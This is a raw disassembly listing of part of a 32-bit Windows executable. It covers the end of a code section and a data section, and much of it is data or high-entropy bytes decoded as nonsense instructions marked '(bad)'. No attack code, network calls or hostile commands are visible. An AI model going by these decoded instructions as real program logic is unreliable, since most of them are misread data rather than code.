  41130e:	lock test al,0x4b
  411311:	or     esp,DWORD PTR [edi]
  411313:	or     eax,0x6faeb036
  411318:	daa    
  411319:	fwait
  41131a:	sub    dl,BYTE PTR [edx+0xa]
  41131d:	popa   
  41131e:	dec    edx
  41131f:	push   ecx
  411320:	sbb    ch,0x2d
  411323:	jns    0x411373
  411325:	cmp    al,0x9b
  411327:	push   0xa
  411329:	pop    ecx
  41132a:	push   0x4
  41132c:	pop    ebx
  41132d:	inc    ebx
  41132e:	xchg   ebx,ecx
  411330:	sub    ebx,ecx
  411332:	xchg   ebx,ecx
  411334:	dec    ecx
  411335:	mov    eax,DWORD PTR [ebp-0x1c]
  411338:	imul   eax,ecx
  41133b:	add    esp,eax
  41133d:	xchg   edx,eax
  41133e:	push   eax
  41133f:	xor    ebx,ebx
  411341:	mov    edx,esp
  411343:	jmp    0x41147e
  411348:	sub    BYTE PTR [edi+0x7165615e],cl
  41134e:	xor    ebx,DWORD PTR [ebp-0x7b]
  411351:	into   
  411352:	jge    0x411370
  411354:	adc    eax,0x4d6e6fad
  411359:	inc    ebx
  41135a:	jl     0x4113d8
  41135c:	adc    bh,BYTE PTR [edi+0x7c]
  41135f:	jl     0x411306
  411361:	dec    esp
  411362:	mov    bl,0x26
  411364:	(bad)  
  411365:	cmp    al,0x14
  411367:	stos   DWORD PTR es:[edi],eax
  411368:	adc    DWORD PTR [ecx],ecx
  41136a:	or     esp,eax
  41136c:	call   0xb227:0x6a4a325f
  411373:	pop    esp
  411374:	inc    edx
  411375:	loope  0x411395
  411377:	xor    eax,0x80dc63a6
  41137c:	add    al,0x47
  41137e:	sbb    al,0x2b
  411380:	adc    ah,BYTE PTR [eax]
  411382:	lods   eax,DWORD PTR ds:[esi]
  411383:	call   0x89408a9c
  411388:	(bad)  
  411389:	das    
  41138a:	arpl   WORD PTR [edx+edi*4+0x2bb8a7c9],cx
  411391:	test   ebx,0x23f202c5
  411397:	test   BYTE PTR [ecx-0x6dd12f8a],cl
  41139d:	xor    eax,ebx
  41139f:	xlat   BYTE PTR ds:[ebx]
  4113a0:	leave  
  4113a1:	(bad)  
  4113a2:	mov    edx,0x306f26a0
  4113a7:	mov    al,0xdf
  4113a9:	aas    
  4113aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113ab:	inc    esp
  4113ac:	jle    0x4113b0
  4113ae:	cmp    al,0x22
  4113b0:	mov    dl,BYTE PTR [esi+0x1c]
  4113b3:	jmp    0xf7f:0xe011ad06
  4113ba:	mov    ds:0x537c57a7,eax
  4113bf:	push   eax
  4113c0:	data16 lahf 
  4113c2:	and    al,0x60
  4113c4:	inc    esp
  4113c5:	fwait
  4113c6:	push   esp
  4113c7:	push   ss
  4113c8:	inc    esp
  4113c9:	cmp    DWORD PTR [edx-0x24],eax
  4113cc:	pop    eax
  4113cd:	mov    bl,0x71
  4113cf:	in     al,0x9c
  4113d1:	mov    ebp,0x36ec8b00
  4113d6:	push   esi
  4113d7:	mov    cs,ebp
  4113d9:	ds (bad) 
  4113dc:	scas   eax,DWORD PTR es:[edi]
  4113dd:	mov    dl,0x90
  4113df:	add    DWORD PTR [edi+0x23],edx
  4113e2:	add    DWORD PTR [ebx-0x6],esi
  4113e5:	adc    al,0x19
  4113e7:	adc    DWORD PTR [ebp+0x46],esp
  4113ea:	pop    ebx
  4113eb:	scas   eax,DWORD PTR es:[edi]
  4113ec:	add    eax,0x3dbe7ae6
  4113f1:	into   
  4113f2:	cmp    BYTE PTR [edi+0x21],ah
  4113f5:	icebp  
  4113f6:	pop    esp
  4113f7:	sar    BYTE PTR [ebx+0x4c79c6c5],1
  4113fd:	mov    fs,WORD PTR [esi+ebp*4-0x6071a953]
  411404:	enter  0xb7ff,0x1f
  411408:	adc    dl,BYTE PTR [ecx]
  41140a:	pop    esi
  41140b:	and    ebp,edx
  41140d:	and    edx,esp
  41140f:	pop    edi
  411410:	jae    0x41145b
  411412:	inc    ebp
  411413:	sti    
  411414:	mov    esi,0xef6ae310
  411419:	mov    esp,0x9987051b
  41141e:	mov    edi,0xac6eb104
  411423:	adc    esi,esi
  411425:	jp     0x411444
  411427:	xchg   ebp,eax
  411428:	loope  0x41142a
  41142a:	pop    esi
  41142b:	xor    edx,DWORD PTR ds:0x29356470
  411431:	mov    esp,0xd8e4cf12
  411436:	stc    
  411437:	jmp    0x411450
  411439:	ja     0x41143c
  41143b:	mov    ds:0xcb27a34d,al
  411440:	push   ds
  411441:	xor    ebx,edi
  411443:	xor    esi,DWORD PTR [ebx]
  411445:	mov    cl,0x19
  411447:	pop    eax
  411448:	test   BYTE PTR [esi+0x4b],dh
  41144b:	(bad)  
  41144c:	popa   
  41144d:	and    ebx,DWORD PTR [ebx+0x52]
  411450:	daa    
  411451:	imul   esp,DWORD PTR [edi],0x44
  411454:	in     eax,0xba
  411456:	cmc    
  411457:	data16 jno 0x4113ef
  41145a:	fadd   st(3),st
  41145c:	aas    
  41145d:	(bad)  
  41145e:	jmp    0xc59b2ecd
  411463:	push   esi
  411464:	xor    eax,0x2c524172
  411469:	jno    0x4113ff
  41146b:	mov    dl,0x3d
  41146d:	dec    esp
  41146e:	pop    esp
  41146f:	jg     0x4114eb
  411471:	iret   
  411472:	leave  
  411473:	mov    ?,WORD PTR [edi-0x70]
  411476:	rcl    BYTE PTR [ebx-0x6f96549],cl
  41147c:	int    0xc3
  41147e:	dec    edx
  41147f:	inc    ebx
  411480:	add    ebx,DWORD PTR [edx+ebx*1]
  411483:	dec    ebx
  411484:	xor    edx,edx
  411486:	add    DWORD PTR [ebp-0xc],ebx
  411489:	pop    ebx
  41148a:	mov    eax,DWORD PTR [ebp-0xc]
  41148d:	pop    edi
  41148e:	pop    esi
  41148f:	pop    ebx
  411490:	leave  
  411491:	ret    0x10

Disassembly of section .data:

00412000 <.data>:
  412000:	and    BYTE PTR [ecx],ch
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    ch,BYTE PTR [ecx]
  412006:	add    DWORD PTR [eax],eax
  412008:	xor    al,0x29
  41200a:	add    DWORD PTR [eax],eax
  41200c:	inc    eax
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [edx+0x29],cl
  412012:	add    DWORD PTR [eax],eax
  412014:	pop    eax
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    BYTE PTR [edx+0x29],ah
  41201a:	add    DWORD PTR [eax],eax
  41201c:	je     0x412047
  41201e:	add    DWORD PTR [eax],eax
  412020:	jle    0x41204b
  412022:	add    DWORD PTR [eax],eax
  412024:	mov    WORD PTR [ecx],gs
  412026:	add    DWORD PTR [eax],eax
  412028:	xchg   esi,eax
  412029:	sub    DWORD PTR [ecx],eax
  41202b:	add    BYTE PTR [esi-0x4ffffed7],ah
  412031:	sub    DWORD PTR [ecx],eax
  412033:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41203a:	add    DWORD PTR [eax],eax
  41203c:	aam    0x29
  41203e:	add    DWORD PTR [eax],eax
  412040:	loopne 0x41206b
  412042:	add    DWORD PTR [eax],eax
  412044:	jmp    0x129:0xf2000129
  41204b:	add    BYTE PTR [eax],al
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    BYTE PTR [edx],cl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx+ebp*1],dl
  412056:	add    DWORD PTR [eax],eax
  412058:	and    ch,BYTE PTR [edx]
  41205a:	add    DWORD PTR [eax],eax
  41205c:	sub    al,0x2a
  41205e:	add    DWORD PTR [eax],eax
  412060:	xor    al,0x2a
  412062:	add    DWORD PTR [eax],eax
  412064:	inc    eax
  412065:	sub    al,BYTE PTR [ecx]
  412067:	add    BYTE PTR [edx+0x2a],cl
  41206a:	add    DWORD PTR [eax],eax
  41206c:	push   esp
  41206d:	sub    al,BYTE PTR [ecx]
  41206f:	add    BYTE PTR [esi+0x2a],bl
  412072:	add    DWORD PTR [eax],eax
  412074:	data16 sub al,BYTE PTR [ecx]
  412077:	add    BYTE PTR [eax+0x2a],dh
  41207a:	add    DWORD PTR [eax],eax
  41207c:	jp     0x4120a8
  41207e:	add    DWORD PTR [eax],eax
  412080:	sub    BYTE PTR [edx],0x1
  412083:	add    BYTE PTR [esi-0x65fffed6],cl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx-0x53fffed6],ah
  412091:	sub    al,BYTE PTR [ecx]
  412093:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  41209a:	add    DWORD PTR [eax],eax
  41209c:	retf   0x12a
  41209f:	add    ah,dl
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    dh,bl
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    dl,dh
  4120a9:	sub    al,BYTE PTR [ecx]
  4120ab:	add    dh,bh
  4120ad:	sub    al,BYTE PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [edx],bl
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [esi],ch
  4120b9:	sub    eax,DWORD PTR [ecx]
  4120bb:	add    BYTE PTR [esi],bh
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4120c3:	add    BYTE PTR [eax+0x2b],bl
  4120c6:	add    DWORD PTR [eax],eax
  4120c8:	push   0x7e00012b
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [edx-0x59fffed5],dl
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4120de:	add    DWORD PTR [eax],eax
  4120e0:	loopne 0x41210d
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	in     al,dx
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dh,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [esi],dl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [eax],ch
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],bh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [edx+0x2c],al
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	pop    eax
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [edx+0x2c],dh
  412102:	add    DWORD PTR [eax],eax
  412104:	jle    0x412132
  412106:	add    DWORD PTR [eax],eax
  412108:	mov    ch,BYTE PTR [ecx+eax*1]
  41210b:	add    BYTE PTR [esi-0x47fffed4],bl
  412111:	sub    al,0x1
  412113:	add    ah,al
  412115:	sub    al,0x1
  412117:	add    dl,dl
  412119:	sub    al,0x1
  41211b:	add    ah,ah
  41211d:	sub    al,0x1
  41211f:	add    al,dh
  412121:	sub    al,0x1
  412123:	add    BYTE PTR [esi],al
  412125:	sub    eax,0x2d140001
  41212a:	add    DWORD PTR [eax],eax
  41212c:	and    ch,BYTE PTR ds:0x2d300001
  412132:	add    DWORD PTR [eax],eax
  412134:	dec    edx
  412135:	sub    eax,0x2d5e0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	push   0x2d
  41213e:	add    DWORD PTR [eax],eax
  412140:	jp     0x41216f
  412142:	add    DWORD PTR [eax],eax
  412144:	xchg   esi,eax
  412145:	sub    eax,0x2da60001
  41214a:	add    DWORD PTR [eax],eax
  41214c:	mov    dh,0x2d
  41214e:	add    DWORD PTR [eax],eax
  412150:	(bad)  
  412151:	sub    eax,0x2dd20001
  412156:	add    DWORD PTR [eax],eax
  412158:	loop   0x412187
  41215a:	add    DWORD PTR [eax],eax
  41215c:	hlt    
  41215d:	sub    eax,0x2dfe0001
  412162:	add    DWORD PTR [eax],eax
  412164:	push   cs
  412165:	add    DWORD PTR cs:[eax],eax
  412168:	push   ds
  412169:	add    DWORD PTR cs:[eax],eax
  41216c:	sub    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	add    BYTE PTR [eax],al
  412172:	add    BYTE PTR [eax],al
  412174:	dec    edx
  412175:	add    DWORD PTR cs:[eax],eax
  412178:	add    BYTE PTR [eax],al
  41217a:	add    BYTE PTR [eax],al
  41217c:	push   0x8000012e
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	mov    WORD PTR [esi],gs
  412186:	add    DWORD PTR [eax],eax
  412188:	call   0x12e:0xb200012e
  41218f:	add    dh,al
  412191:	add    DWORD PTR cs:[eax],eax
  412194:	fsubr  QWORD PTR [esi]
  412196:	add    DWORD PTR [eax],eax
  412198:	call   0xf84122cb
  41219d:	add    DWORD PTR cs:[eax],eax
  4121a0:	adc    BYTE PTR [edi],ch
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	push   ds
  4121a5:	das    
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	xor    BYTE PTR [edi],ch
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	inc    eax
  4121ad:	das    
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	push   esi
  4121b1:	das    
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	data16 das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	jbe    0x4121e9
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	mov    ch,BYTE PTR [edi]
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	xchg   esi,eax
  4121c1:	das    
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c5:	das    
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    dl,0x2f
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	enter  0x12f,0x0
  4121d0:	loopne 0x412201
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	hlt    
  4121d5:	das    
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	add    dh,BYTE PTR [eax]
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	sbb    BYTE PTR [eax],dh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xor    BYTE PTR cs:[ecx],al
  4121e3:	add    BYTE PTR [edx],bh
  4121e5:	xor    BYTE PTR [ecx],al
  4121e7:	add    BYTE PTR [eax+0x30],cl
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   edx
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi+0x30],ah
  4121f2:	add    DWORD PTR [eax],eax
  4121f4:	jbe    0x412226
  4121f6:	add    DWORD PTR [eax],eax
  4121f8:	mov    dh,BYTE PTR [eax]
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	pushf  
  4121fd:	xor    BYTE PTR [ecx],al
  4121ff:	add    BYTE PTR [eax-0x3bfffed0],dh
  412205:	xor    BYTE PTR [ecx],al
  412207:	add    ah,dl
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    dl,ch
  41220d:	xor    BYTE PTR [ecx],al
  41220f:	add    BYTE PTR [edx],al
  412211:	xor    DWORD PTR [ecx],eax
  412213:	add    BYTE PTR [edx],bl
  412215:	xor    DWORD PTR [ecx],eax
  412217:	add    BYTE PTR [esi],ah
  412219:	xor    DWORD PTR [ecx],eax
  41221b:	add    BYTE PTR [eax],bh
  41221d:	xor    DWORD PTR [ecx],eax
  41221f:	add    BYTE PTR [edx+0x31],cl
  412222:	add    DWORD PTR [eax],eax
  412224:	push   esi
  412225:	xor    DWORD PTR [ecx],eax
  412227:	add    BYTE PTR [eax+0x31],ch
  41222a:	add    DWORD PTR [eax],eax
  41222c:	jbe    0x41225f
  41222e:	add    DWORD PTR [eax],eax
  412230:	xor    BYTE PTR [ecx],0x1
  412233:	add    BYTE PTR [esi-0x59fffecf],dl
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [eax-0x2dfffecf],bh
  412241:	xor    DWORD PTR [ecx],eax
  412243:	add    dl,ch
  412245:	xor    DWORD PTR [ecx],eax
  412247:	add    BYTE PTR [eax],al
  412249:	add    BYTE PTR [eax],al
  41224b:	add    BYTE PTR [esi],al
  41224d:	xor    al,BYTE PTR [ecx]
  41224f:	add    BYTE PTR [edx+esi*1],bl
  412252:	add    DWORD PTR [eax],eax
  412254:	xor    dh,BYTE PTR [edx]
  412256:	add    DWORD PTR [eax],eax
  412258:	inc    edx
  412259:	xor    al,BYTE PTR [ecx]
  41225b:	add    BYTE PTR [edx+0x32],dl
  41225e:	add    DWORD PTR [eax],eax
  412260:	pusha  
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax+0x32],dh
  412266:	add    DWORD PTR [eax],eax
  412268:	test   BYTE PTR [edx],dh
  41226a:	add    DWORD PTR [eax],eax
  41226c:	xchg   esp,eax
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [eax-0x41fffece],ch
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    ah,cl
  412279:	xor    al,BYTE PTR [ecx]
  41227b:	add    al,ah
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    al,dh
  412281:	xor    al,BYTE PTR [ecx]
  412283:	add    BYTE PTR [edx],al
  412285:	xor    eax,DWORD PTR [ecx]
  412287:	add    BYTE PTR [edx],bl
  412289:	xor    eax,DWORD PTR [ecx]
  41228b:	add    BYTE PTR [esi],ah
  41228d:	xor    eax,DWORD PTR [ecx]
  41228f:	add    BYTE PTR [ebx+esi*1],dh
  412292:	add    DWORD PTR [eax],eax
  412294:	inc    esp
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [edx+0x33],dl
  41229a:	add    DWORD PTR [eax],eax
  41229c:	push   0x7a000133
  4122a1:	xor    eax,DWORD PTR [ecx]
  4122a3:	add    BYTE PTR [esi-0x6bfffecd],al
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi-0x4bfffecd],ah
  4122b1:	xor    eax,DWORD PTR [ecx]
  4122b3:	add    dh,al
  4122b5:	xor    eax,DWORD PTR [ecx]
  4122b7:	add    al,bl
  4122b9:	xor    eax,DWORD PTR [ecx]
  4122bb:	add    dl,ch
  4122bd:	xor    eax,DWORD PTR [ecx]
  4122bf:	add    dl,bh
  4122c1:	xor    eax,DWORD PTR [ecx]
  4122c3:	add    BYTE PTR [esi],al
  4122c5:	xor    al,0x1
  4122c7:	add    BYTE PTR [esp+esi*1],bl
  4122ca:	add    DWORD PTR [eax],eax
  4122cc:	cmp    BYTE PTR [ecx+eax*1],dh
  4122cf:	add    BYTE PTR [edx+0x34],dl
  4122d2:	add    DWORD PTR [eax],eax
  4122d4:	data16 xor al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1+0x1],dh
  4122db:	add    BYTE PTR [eax-0x6dfffecc],al
  4122e1:	xor    al,0x1
  4122e3:	add    BYTE PTR [edx-0x51fffecc],ah
  4122e9:	xor    al,0x1
  4122eb:	add    BYTE PTR [edx-0x37fffecc],bh
  4122f1:	xor    al,0x1
  4122f3:	add    al,ah
  4122f5:	xor    al,0x1
  4122f7:	add    al,dh
  4122f9:	xor    al,0x1
  4122fb:	add    BYTE PTR [eax],cl
  4122fd:	xor    eax,0x351a0001
  412302:	add    DWORD PTR [eax],eax
  412304:	sub    dh,BYTE PTR ds:0x35380001
  41230a:	add    DWORD PTR [eax],eax
  41230c:	dec    edx
  41230d:	xor    eax,0x35580001
  412312:	add    DWORD PTR [eax],eax
  412314:	fs xor eax,0x35720001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	jl     0x412353
  41231e:	add    DWORD PTR [eax],eax
  412320:	xchg   esp,eax
  412321:	xor    eax,0x35a40001
  412326:	add    DWORD PTR [eax],eax
  412328:	mov    ah,0x35
  41232a:	add    DWORD PTR [eax],eax
  41232c:	ret    0x135
  41232f:	add    al,dl
  412331:	xor    eax,0x35e00001
  412336:	add    DWORD PTR [eax],eax
  412338:	div    BYTE PTR ds:0x36080001
  41233e:	add    DWORD PTR [eax],eax
  412340:	push   ss
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	sub    al,0x36
  412346:	add    DWORD PTR [eax],eax
  412348:	cmp    dh,BYTE PTR [esi]
  41234a:	add    DWORD PTR [eax],eax
  41234c:	push   edx
  41234d:	add    DWORD PTR ss:[eax],eax
  412350:	pop    esi
  412351:	add    DWORD PTR ss:[eax],eax
  412354:	push   0x36
  412356:	add    DWORD PTR [eax],eax
  412358:	jbe    0x412390
  41235a:	add    DWORD PTR [eax],eax
  41235c:	test   BYTE PTR [esi],dh
  41235e:	add    DWORD PTR [eax],eax
  412360:	xchg   esi,eax
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	mov    ds:0xb4000136,al
  412369:	add    DWORD PTR ss:[eax],eax
  41236c:	shl    BYTE PTR [esi],0x1
  41236f:	add    dh,cl
  412371:	add    DWORD PTR ss:[eax],eax
  412374:	fdiv   QWORD PTR [esi]
  412376:	add    DWORD PTR [eax],eax
  412378:	call   0xf64124b3
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	add    al,0x37
  412382:	add    DWORD PTR [eax],eax
  412384:	adc    al,0x37
  412386:	add    DWORD PTR [eax],eax
  412388:	es aaa 
  41238a:	add    DWORD PTR [eax],eax
  41238c:	cmp    al,0x37
  41238e:	add    DWORD PTR [eax],eax
  412390:	inc    esi
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	push   esp
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	fs aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	jbe    0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	test   BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	cwde   
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	mov    dl,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	les    esi,FWORD PTR [edi]
  4123ae:	add    DWORD PTR [eax],eax
  4123b0:	aam    0x37
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	call   0xfa4124f0
  4123b9:	aaa    
  4123ba:	add    DWORD PTR [eax],eax
  4123bc:	or     bh,BYTE PTR [eax]
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	push   ss
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],dh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	inc    esi
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123cf:	add    BYTE PTR [eax+0x38],bh
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	nop
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	mov    edx,0xc8000138
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    ah,ah
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    dl,dh
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    BYTE PTR [esi],al
  4123f1:	cmp    DWORD PTR [ecx],eax
  4123f3:	add    BYTE PTR [eax],bl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [edx],ch
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [edx],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax+0x39],dl
  412402:	add    DWORD PTR [eax],eax
  412404:	cmp    WORD PTR [ecx],ax
	...
  41240f:	add    dh,cl
  412411:	add    al,cl
  412413:	dec    ebp
  412414:	add    BYTE PTR [eax],al
  412416:	add    BYTE PTR [eax],al
  412418:	add    al,BYTE PTR [eax]
  41241a:	add    BYTE PTR [eax],al
  41241c:	dec    ebp
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx],bh
  412421:	cmp    al,BYTE PTR [ebx]
  412423:	add    BYTE PTR [edx],bh
  412425:	and    al,0x3
	...
  41242f:	add    dh,cl
  412431:	add    al,cl
  412433:	dec    ebp
  412434:	add    BYTE PTR [eax],al
  412436:	add    BYTE PTR [eax],al
  412438:	pop    esi
  412439:	and    al,0x1
  41243b:	add    BYTE PTR [ecx],al
  41243d:	add    BYTE PTR [eax],al
  41243f:	add    BYTE PTR [ecx],al
  412441:	add    BYTE PTR [eax],al
  412443:	add    BYTE PTR [ecx],al
  412445:	add    BYTE PTR [eax],al
  412447:	add    BYTE PTR [esp+0x1],dl
  41244b:	add    BYTE PTR [eax+0x24],bl
  41244e:	add    DWORD PTR [eax],eax
  412450:	pop    esp
  412451:	and    al,0x1
  412453:	add    BYTE PTR [esi+0x6f000032],al
  412459:	and    al,0x1
  41245b:	add    BYTE PTR [eax],al
  41245d:	add    BYTE PTR [esi+0x64],ch
  412460:	jae    0x4124d4
  412462:	bound  esp,QWORD PTR [esi+0x64]
  412465:	push   edi
  412466:	inc    si
  412468:	popa   
  412469:	xor    al,0x2e
  41246b:	je     0x4124dc
  41246d:	jo     0x41246f
  41246f:	aas    
  412470:	dec    eax
  412471:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  412479:	gs jb  0x4124cb
  41247c:	jb     0x4124e7
  41247e:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  412486:	inc    edi
  412487:	inc    esi
  412488:	dec    ebx
  412489:	push   eax
  41248a:	inc    ecx
  41248b:	dec    ecx
  41248c:	push   eax
  41248d:	inc    ecx
  41248e:	inc    esp
  41248f:	cmp    al,0x56
	...
  412499:	add    BYTE PTR [eax],al
  41249b:	add    BYTE PTR [eiz*1+0x1],dl
  4124a2:	add    BYTE PTR [eax],al
  4124a4:	add    BYTE PTR [eax],al
  4124a6:	add    BYTE PTR [eax],al
  4124a8:	push   cs
  4124a9:	sub    eax,DWORD PTR [ecx]
  4124ab:	add    BYTE PTR [eax],al
  4124ad:	and    BYTE PTR [ecx],al
  4124af:	add    al,cl
  4124b1:	and    eax,0x1
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	add    BYTE PTR [eax],al
  4124ba:	add    BYTE PTR [eax],al
  4124bc:	inc    eax
  4124bd:	add    DWORD PTR cs:[eax],eax
  4124c0:	mov    ah,0x20
  4124c2:	add    DWORD PTR [eax],eax
  4124c4:	mov    BYTE PTR [esi],ah
  4124c6:	add    DWORD PTR [eax],eax
	...
  4124d0:	pop    esp
  4124d1:	add    DWORD PTR cs:[eax],eax
  4124d4:	je     0x4124f7
  4124d6:	add    DWORD PTR [eax],eax
  4124d8:	nop
  4124d9:	add    DWORD PTR es:[eax],eax
	...
  4124e4:	clc    
  4124e5:	xor    DWORD PTR [ecx],eax
  4124e7:	add    BYTE PTR [ecx+eiz*1+0x1],bh
  4124eb:	add    BYTE PTR [eax+0x27],ah
  4124ee:	add    DWORD PTR [eax],eax
	...
  4124f8:	jb     0x412533
  4124fa:	add    DWORD PTR [eax],eax
  4124fc:	dec    esp
  4124fd:	and    al,BYTE PTR [ecx]
	...
  412513:	add    BYTE PTR [eax],ah
  412515:	sub    DWORD PTR [ecx],eax
  412517:	add    BYTE PTR [edx],ch
  412519:	sub    DWORD PTR [ecx],eax
  41251b:	add    BYTE PTR [ecx+ebp*1],dh
  41251e:	add    DWORD PTR [eax],eax
  412520:	inc    eax
  412521:	sub    DWORD PTR [ecx],eax
  412523:	add    BYTE PTR [edx+0x29],cl
  412526:	add    DWORD PTR [eax],eax
  412528:	pop    eax
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [edx+0x29],ah
  41252e:	add    DWORD PTR [eax],eax
  412530:	je     0x41255b
  412532:	add    DWORD PTR [eax],eax
  412534:	jle    0x41255f
  412536:	add    DWORD PTR [eax],eax
  412538:	mov    WORD PTR [ecx],gs
  41253a:	add    DWORD PTR [eax],eax
  41253c:	xchg   esi,eax
  41253d:	sub    DWORD PTR [ecx],eax
  41253f:	add    BYTE PTR [esi-0x4ffffed7],ah
  412545:	sub    DWORD PTR [ecx],eax
  412547:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41254e:	add    DWORD PTR [eax],eax
  412550:	aam    0x29
  412552:	add    DWORD PTR [eax],eax
  412554:	loopne 0x41257f
  412556:	add    DWORD PTR [eax],eax
  412558:	jmp    0x129:0xf2000129
  41255f:	add    BYTE PTR [eax],al
  412561:	sub    al,BYTE PTR [ecx]
  412563:	add    BYTE PTR [edx],cl
  412565:	sub    al,BYTE PTR [ecx]
  412567:	add    BYTE PTR [edx+ebp*1],dl
  41256a:	add    DWORD PTR [eax],eax
  41256c:	and    ch,BYTE PTR [edx]
  41256e:	add    DWORD PTR [eax],eax
  412570:	sub    al,0x2a
  412572:	add    DWORD PTR [eax],eax
  412574:	xor    al,0x2a
  412576:	add    DWORD PTR [eax],eax
  412578:	inc    eax
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+0x2a],cl
  41257e:	add    DWORD PTR [eax],eax
  412580:	push   esp
  412581:	sub    al,BYTE PTR [ecx]
  412583:	add    BYTE PTR [esi+0x2a],bl
  412586:	add    DWORD PTR [eax],eax
  412588:	data16 sub al,BYTE PTR [ecx]
  41258b:	add    BYTE PTR [eax+0x2a],dh
  41258e:	add    DWORD PTR [eax],eax
  412590:	jp     0x4125bc
  412592:	add    DWORD PTR [eax],eax
  412594:	sub    BYTE PTR [edx],0x1
  412597:	add    BYTE PTR [esi-0x65fffed6],cl
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x53fffed6],ah
